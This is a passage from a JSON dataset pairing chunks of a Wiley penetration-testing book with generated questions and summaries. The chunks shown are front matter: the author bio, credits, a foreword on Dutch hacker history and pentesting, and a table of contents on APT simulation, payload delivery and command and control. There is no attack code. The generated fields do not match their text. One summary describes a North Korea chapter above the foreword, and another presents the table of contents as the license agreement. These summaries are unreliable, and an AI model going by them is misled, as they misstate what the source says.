spoken?”\n—Going Postal\nAbout the Author\nWil Allsopp always liked taking things apart. Sometimes he was able to put\nthem back together again. He wandered into penetration testing like some\npeople wander into bars (another activity close to his heart). A chance\nencounter with a like-minded individual in the 't Stadscafe Zaltbommel in\n1999 led to him resigning his IBM software development contract and\nforming his first company, called Tigerteam Security NV, which for reasons\nlost to time was incorporated in Curaçao. At least that's how he remembers it.\nNearly 20 years later, he's still breaking things, with the important difference\nthat some of the most prestigious companies in the world are paying him to\ndo so.\nHe lives in The Netherlands with his wife and a large menagerie of cats, dogs,\nchickens, and a toad named Malcolm.\n“We work in the dark—we do what we can—we give what we\nhave. Our doubt is our passion, and our passion is our task. The\nrest is the madness of art.”\n—Henry James\nAbout the Technical Editor\nElias Bachaalany has been a computer programmer and a software reverse\nengineer for more than 14 years. Elias is also the co-author of two books\npublished by Wiley, Practical Reverse Engineering and The Antivirus\nHacker's Handbook, and the author of Batchography: The Art of Batch Files\nProgramming. He worked with various technologies and programming\nlanguages such as web programming, database programming, and Windows\ndevice drivers programming (boot loaders and minimal operating systems),\nand wrote .NET and managed code, wrote scripts, assessed software\nprotections, and wrote reverse engineering and desktop security tools.\nCredits\nProject Editor\nAdaobi Obi Tulton\nTechnical Editor\nElias Bachaalany\nProduction Editor\nBarath Kumar Rajasekaran\nCopy Editor\nKezia Endsley\nManager of Content Development & Assembly\nMary Beth Wakefield\nProduction Manager\nKathleen Wisor\nMarketing Manager\nCarrie Sherrill\nProfessional Technology & Strategy Director\nBarry Pruett\nBusiness Manager\nAmy Knies\nExecutive Editor\nJim Minatel\nProject Coordinator, Cover\nBrent Savage\nProofreader\nNancy Bell\nIndexer\nJohnna VanHoose Dinse\nCover Designer\nWiley\nCover Image\nBullet © Ejla/istock.com; card © zlisjak/istock.com; torn edges ©\nhudiemm/istock.com\nAcknowledgments\nFar too many to name (and they know who they are), but special thanks to\nTim and Courtney without whom this work would not be possible in its\ncurrent format; D. Kerry Davies, for being the yardstick by which the rest of\nare measured; GCHQ, for their helpful suggestions; and last but not least,\nGary McGath, one of the most underrated musicians of our age.\nAlso, thanks to every pen tester, hacker, and security evangelist I've toiled\nwith over the years. You are this book.\nForeword\nEver since I came first into contact with computers, the security (or insecurity\nif you want) of these very powerful systems has intrigued me. Living in The\nNetherlands, I was fortunate to be able to use a Philips P9200 system of the\nTechnical University Eindhoven by dialing into it using a 300 baud modem\nwhen I attended high school to learn programming in ALGOL 60. Personal\ncomputers were virtually nonexistent at that time and computer systems like\nthis cost a small fortune. Using a modem to connect to a system that you\ncould program to solve lots of computational problems was already something\nmagical, but gaining access to the machine itself became something of a\nquest. Since it was located on the university's campus, this was not that\nproblematic. At that time, security was not really a big issue, and walking onto\nthe premises as a young scholar asking for a tour of the facility was all it took.\nThere I learned that the P9200 was just a “small mini computer.” The real\ndeal was the Burroughs B7700 mainframe. It took some snooping around to\nfind the dial-in number for that system, and a lot of persuading to get an\naccount on that system, but eventually I succeeded. I did not hack the system\nat that time, but social engineering (being able to tell a persuading enough\nstory to gain trust and/or information) proved to be a very valuable trait to\nhave.\nWhile I studied computing science, we eventually had to use Prime\ncomputers. Let me just state that computer security at that time was not\nconsidered important. The number of bugs in the operating system (PrimeOS)\nwere numerous, and even fixes for security problems we uncovered would\ncontain new security bugs. At that time, information security really caught my\nattention and it has not faded since. Just before graduating, I started working\nfor a small company called Positronika, developing systems for the nuclear\nindustry, ranging from a small pocket dosimeter (based on a 6502 processor)\nto large automated measurement systems. They used PDP-11 systems for fuel\nrods after they were used in a nuclear reactor. I not only learned the\nimportance of safety, but also learned how to write secure computer code. You\njust could not risk the various rod handling routines and drop some very\nhighly radioactive material. It could be fatal.\nIn 1989, I came into contact with an underground and obscure publication\ncalled Hack-Tic, which was a so-called hacker magazine published irregularly.\nIt opened up a whole new world to me. I suddenly noticed there were many\nmore people interested in IT security and they published lots of other\ninformation as well. This included information on the phone system, which\nthe Dutch telecom provider—at that time called PTT—was not too pleased\nwith (they still did not understand that security through obscurity is a\nfundamentally bad idea!), as well as information about picking locks, to name\nbut a few tricks. Discussing subjects like these with like-minded people\neventually grew to monthly gatherings, random parties, and hacker events (in\nhotels and on campgrounds—always including high-speed Internet\nconnectivity). Nowadays, there are even hacker spaces where people not only\nare building or breaking software, but are using all kinds of modern\ntechnology in new ways. So what once started as an underground movement\nis currently very well connected in modern society.\nFast forward to the year 2000. After several positions at various companies,\neventually resulting in a lead role in a pentest group at one of the largest\ncomputer centers in The Netherlands, two friends and I decided we would\nstart a business ourselves. The Internet bubble had just busted and we\nthought it a good idea to start a consultancy company focusing on information\nsecurity. Luckily, we always had the credo, “If we do not succeed, we should at\nleast be able to tell ourselves we had a blast.” Little did we know.\nThe first assignment came when I was visiting Scandinavia and I had to draft\na contract for this penetration test in a room of a hotel I walked by while\ntalking to the prospect and used their fax machine to send it out. We did not\neven have a name for this venture of ours.\nEven though the bubble busted and various Internet companies were forced\nto close shop, we continued, eventually choosing the name Madison Gurkha\nsince we could not find any domain name containing something that came\nclose to the service we tried to provide. The advantages of this exotic name\nwere numerous, ranging from the fact you had to spell it at least three times\n(so it would really be burned into the brains of those who had to deal with\nus), to the assumption people made (and still make) that we were an\ninternational conglomerate with an HQ somewhere outside of The\nNetherlands.\nAt that time we had no need for a sales and marketing department. Our\npersonal network was expanding and there were not many businesses\nproviding our services, so verbal recommendations brought the opportunities\nto our door. At that time we basically only did vulnerability assessments of\nweb applications and ICT infrastructures, and some pentesting when our\ncustomers were really interested in the impact of real-live attacks on their ICT\nenvironments. Since there were hardly any tools available, we had to create\nour own exploits and scripts to make our lives easier. Exploits were\nsometimes also published on the Internet (mostly in newsgroups), but you\nhad to compile them yourself and they always contained some flaw so that\nscript kiddies who just compiled the thing, but did not understand the actual\nproblem, could not use the code (you had to make some minor modifications\nto be able to use it). At the time of this writing, tools like Metasploit and\nNessus are widely available and popular TV shows like Mr. Robot show these\ntools at work.\nBut IT security advances. It always has been, and will probably always be, a\nprecarious balance between attacks and defenses. The available tools will be\nenhanced and become more powerful and more advanced tools will become\navailable. But only in the hands of a well-educated specialist will they add real\nvalue. That person not only understands the benefits of the tools but also\nknows their limitations and how to interpret the results.\nWil Allsopp is one such specialist. I have been fortunate to work with Wil\nwhen he joined Madison Gurkha in 2006. At that time we were a couple of\nyears old and expanding from the three-person start-up to the well-\nestablished dedicated IT security consultancy firm we are today. Wil helped us\npush the bounds of the security testing envelope even further and has done so\never since. He has always looked for new vulnerabilities and wants\ncorporations and institutions to be aware of the latest threats. This book\ncontains various valuable examples of those advanced threats.\nWhen your organization not only is looking for a positive score on the “in\ncontrol” checklist, but really wants to know if it is capable of withstanding the\nkind of very advanced attacks that currently take place on a global scale, you\nshould read this book. Ensure that the company you hire to perform IT\nsecurity assessments can actually execute attacks like these. Once again, Wil\nshows that a real IT security specialist not only does know how to use\navailable tools, but is also able to think outside of the box and develop\nadditional and advanced attacks when needed. Regular vulnerability scans are\nhelpful to keep your infrastructure on par; actual penetration testing using\nadvanced techniques like those described in this book will provide your\norganization with the needed insight on whether you are actually in control of\nyour IT security or have been shutting your eyes to the real dangers out there\nwhile adding ticks to your checklists.\nAmsterdam, October 5, 2016\nHans Van de Looy\nFounder of Madison Gurkha BV",
    "question": "What are the key technologies and security measures used by North Korea in its closed network environment, and how can they be analyzed from a penetration testing perspective?",
    "summary": "This chapter explores how to analyze North Korea's network as a hypothetical intelligence gathering exercise, focusing on its restricted operating systems, walled-garden intranet, and limited public internet access. It also discusses advanced penetration testing techniques, including port scanning, war dialing, and exploiting mobile devices. The chapter highlights the challenges of working with a highly censored and isolated network, while emphasizing the importance of understanding the technical implications of state control over technology."
  },
  {
    "start": 68,
    "end": 68,
    "text": "WILEY END USER LICENSE AGREEMENT\nGo to www.wiley.com/go/eula to access Wiley's ebook EULA.\nTable of Contents\nTitle Page 10\nIntroduction 11\nComing Full Circle 11\nAdvanced Persistent Threat (APT) 11\nNext Generation Technology 13\n“Hackers” 14\nForget Everything You Think You Know About Penetration Testing 15\nHow This Book Is Organized 15\nChapter 1: Medical Records (In)security 18\nAn Introduction to Simulating Advanced Persistent Threat 18\nBackground and Mission Briefing 19\nPayload Delivery Part 1: Learning How to Use the VBA Macro 23\nCommand and Control Part 1: Basics and Essentials 38\nThe Attack 42\nSummary 46\nExercises 47\nChapter 2: Stealing Research 48\nBackground and Mission Briefing 49\nPayload Delivery Part 2: Using the Java Applet for Payload Delivery 50\nNotes on Payload Persistence 60\nCommand and Control Part 2: Advanced Attack Management 65\nThe Attack 69\nSummary 75\nExercises 75\nChapter 3: Twenty-First Century Heist 76\nWhat Might Work? 76\nNothing Is Secure 76\nOrganizational Politics 77\nAPT Modeling versus Traditional Penetration Testing 78\nBackground and Mission Briefing 78\nCommand and Control Part III: Advanced Channels and Data Exfiltration 79\nPayload Delivery Part III: Physical Media 87\nThe Attack 91\nSummary 94\nExercises 94\nChapter 4: Pharma Karma 95\nBackground and Mission Briefing 96\nPayload Delivery Part IV: Client-Side Exploits 1 97\nCommand and Control Part IV: Metasploit Integration 104\nThe Attack 108\nSummary 119\nExercises 120\nChapter 5: Guns and Ammo 121\nBackground and Mission Briefing 122\nPayload Delivery Part V: Simulating a Ransomware Attack 124\nCommand and Control Part V: Creating a Covert C2 Solution 130\nNew Strategies in Stealth and Deployment 135\nThe Attack 144\nSummary 153\nExercises 154\nChapter 6: Criminal Intelligence 155\nPayload Delivery Part VI: Deploying with HTA 156\nPrivilege Escalation in Microsoft Windows 158\nCommand and Control Part VI: The Creeper Box 172\nThe Attack 189\nSummary 192\nExercises 192\nChapter 7: War Games 193\nBackground and Mission Briefing 194\nPayload Delivery Part VII: USB Shotgun Attack 195\nCommand and Control Part VII: Advanced Autonomous Data Exfiltration 198\nThe Attack 203\nSummary 209\nExercises 209\nChapter 8: Hack Journalists 211\nBriefing 211\nAdvanced Concepts in Social Engineering 211\nC2 Part VIII: Experimental Concepts in Command and Control 217\nPayload Delivery Part VIII: Miscellaneous Rich Web Content 224\nThe Attack 225\nSummary 230\nExercises 230\nChapter 9: Northern Exposure 232\nOverview 232\nOperating Systems 233\nNorth Korean Public IP Space 242\nThe North Korean Telephone System 244\nApproved Mobile Devices 249\nThe “Walled Garden”: The Kwangmyong Intranet 250\nAudio and Video Eavesdropping 252\nSummary 254\nExercises 255\nEnd User License Agreement 266",
    "question": "What are the key concepts and techniques covered in the different chapters of the Wiley End User License Agreement text?",
    "summary": "The Wiley End User License Agreement outlines the terms for using an ebook, directing users to access the EULA on www.wiley.com/go/eula. It details various chapters that explore different aspects of advanced persistent threats (APTs), including payload delivery methods, command and control techniques, and real-world attack scenarios. Each chapter provides a background, mission briefing, attack simulation, and exercises to enhance understanding of cybersecurity challenges in modern contexts."
  }
]